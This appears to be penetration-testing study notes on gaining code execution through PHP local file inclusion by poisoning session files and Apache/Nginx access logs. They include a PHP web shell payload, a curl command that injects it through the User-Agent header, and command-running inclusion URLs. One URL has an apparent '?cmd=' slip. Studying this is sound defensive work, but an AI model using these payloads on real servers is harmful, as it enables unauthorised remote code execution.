# Log Poisoning
***
#### As long as the vulnerable function has the `Execute` privileges we can execute PHP code by including a file containing PHP code.
#### These type of attacks can be achieved by writing PHP code into a field that gets logged into a log file to latter include that file to execute the PHP code. Additionally, we would need read privileges to read the logged files.

### PHP Session Poisoning
#### PHP web applications use the `PHPSESSID` cookie to keep track of user details. Furthermore, this data is stored in `session` files on the back-end server, where can be found in `/var/lib/php/sessions/` on linux and in `C:\Windows\Temp\` on Windows. We can guess our file that is holding our data by using the `PHPSESSID` cookie with the `sess_`prefix. For instance, `/var/lib/php/sessions/sess_fv6ukv2jqhvoirg7nkp1snciu2`.
#### Example: `http://<IP>:<PORT>/index.php?lang=not_poisoning`
#### When visiting a page inside the web application, we can see that it gets logged into the above directory
#### By knowing that we got control of the value stored in the session file we can perform the poisoning step. Just simply craft a PHP shell and send it through the `?lang=` parameter.
```http request
http://<IP>:<PORT>/index.php?lang=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```
#### Lastly, we include the session file and execute OS commands:
```
http://<IP>:<PORT>/index.php?lang=/var/lib/php/sessions/sess_fv6ukv2jqhvoirg7nkp1snciu2&cmd=whoami
```

#### As the session file gets overwritten everytime we execute a command we would always need to poison the session file. Moreover, it would be preferred to write a permanent web shell or send a reverse shell.

### Server Log Poisoning
#### Both `Apache` and `Nginx` servers log requests in files like access.log and error.log. The access.log file records details of all requests, including the User-Agent header, which can be controlled by an attacker to inject malicious content (log poisoning).
#### To exploit this via Local File Inclusion (LFI), attackers must access the log files. By default, Nginx logs are readable by low-privileged users (e.g., www-data), while Apache logs usually require higher privileges (e.g., root or adm group). However, misconfigurations or older Apache setups might expose these logs to low-privileged users.
#### Default log locations are:

* Apache: /var/log/apache2/ (Linux) or C:\xampp\apache\logs\ (Windows)
* Nginx: /var/log/nginx/ (Linux) or C:\nginx\log\ (Windows)
#### In cases where logs are stored elsewhere, fuzzing with an LFI wordlist can help identify their paths.

#### When visiting the `/var/log/apache2/access.log`file, for instance, we would see that a variety of parameters get logged, specially the `User-Agent`header. With that into consideration we could poison this value by doing the following:
```bash
$ curl -s "http://<IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

#### Then we include the log page with our OS command
```http request
http://<IP>:<PORT>/index.php?lang=/var/log/apache2/access.log?cmd=whoami
```

#### ***NOTE***: This method can also be executed by including process files under the Linux `/proc/` directory. For example, we may be able to include the `/proc/self/environ` or `/proc/self/fd/N` files (N is a PID between 0-50).

#### Similar log poisoning techniques can be used on various system logs.
* `/var/log/sshd.log`
* `/var/log/mail`
* `/var/log/vsftpd.log`

#### With ftp or ssh services we can try logging into them with a webshell as username. By sending an email containing PHP code we can use `mail` services to execute PHP code.
